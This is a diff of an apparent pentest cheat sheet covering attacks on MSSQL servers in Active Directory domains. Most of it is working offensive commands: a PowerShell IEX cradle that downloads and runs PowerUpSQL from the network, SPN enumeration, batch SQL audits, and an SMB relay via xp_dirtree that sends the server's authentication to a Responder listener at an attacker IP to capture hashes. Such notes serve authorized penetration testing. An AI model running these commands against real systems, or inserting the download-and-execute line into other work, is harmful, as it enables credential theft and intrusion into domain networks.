@@ -287,7 +287,16 @@ MySQL
   Using PowerUpSQL:  
   `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`  
   `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username "domain\user" -password "passw0rd123" | Where-Object {$_.Status -like "Accessible"}`  
-`Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
+  `Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
+  Manually get all SQL SPNs from list of reachable SQL servers:
+  `# add all sql targets to a file called sql_hosts.txt`   
+  `# get all SPNs into a file:`   
+  `foreach($entry in (Get-Content .\sql_hosts.txt)){ $dnsname = (Resolve-DnsName $entry).Namehost; setspn -q *MSSQL*/*$dnsname* | select-string "MSSQL" | Out-File sql_instances.txt -Append }`   
+
+  `# import PowerUpSQL and run the SQLAudit on all instances`   
+  `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`   
+  `foreach($item in ((Get-Content .\sql_instances.txt).trim() | ? {$_ -ne ""})){ Invoke-SQLAudit -Verbose -Instance "$item"}`   
+
   SMB Relay through xp_dirtree:  
   Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
   Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"`   
